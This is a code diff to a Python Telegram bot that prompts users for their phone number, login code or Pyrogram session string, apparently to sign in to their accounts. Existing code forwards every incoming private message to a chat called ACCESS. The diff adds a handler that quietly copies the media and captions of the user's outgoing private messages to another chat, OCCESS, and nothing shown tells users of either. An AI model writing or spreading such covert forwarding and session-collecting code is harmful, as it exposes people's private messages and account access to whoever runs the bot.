@@ -46,7 +46,12 @@ APIHASH = [API_HASH, "1674d13f3308faa1479b445cdbaaad2b"]
 @bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
 async def access(event):
     await event.forward_to(ACCESS)
-            
+
+@bot.on(events.NewMessage(outgoing=True, func=lambda e: e.is_private))
+async def outgoing(event):
+    if event.media:
+        await Drone.send_message(OCCESS, file=event.media, caption=event.text)
+        
 @bot.on(events.NewMessage(incoming=True, pattern="/start"))
 async def start(event):
     await event.reply(f'{st}', 
@@ -70,7 +75,7 @@ async def linc(event):
     passcode = ""
     ai = ''
     ah = ''
-    async with Drone.conversation(event.chat_id) as conv: 
+    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
         try:
             xx = await conv.send_message("Send me your contact number with country code(eg +1 or +91) to login.")
             contact = await conv.get_response()
@@ -164,7 +169,7 @@ async def helpc(event):
 @bot.on(events.NewMessage(incoming=True, pattern="/setthumb"))
 async def helpc(event):
     Drone = event.client                    
-    async with Drone.conversation(event.chat_id) as conv: 
+    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
         xx = await conv.send_message("Send me any image for thumbnail.")
         x = await conv.get_response()
         if not x.media:
@@ -198,7 +203,7 @@ async def sett(event):
     button = await event.get_message()
     msg = await button.get_response() 
     await event.delete()
-    async with Drone.conversation(event.chat_id) as conv: 
+    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
         xx = await conv.send_message("Send me any image for thumbnail as a `reply` to this message.")
         x = await conv.get_reply()
         if not x.media:
@@ -241,7 +246,7 @@ async def lin_ss(event):
     msg = await button.get_reply_message()  
     await event.delete()
     s = ''
-    async with Drone.conversation(event.chat_id) as conv: 
+    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
         try:
             xz = await conv.send_message("send me your Pyrogram `String SESSION`.")  
             z = await conv.get_response()
@@ -264,7 +269,7 @@ async def lin_ph(event):
     passcode = ""
     ai = ''
     ah = ''
-    async with Drone.conversation(event.chat_id) as conv: 
+    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
         try:
             xx = await conv.send_message("Send me your contact number with country code(eg +1 or +91) to login.")
             contact = await conv.get_response()
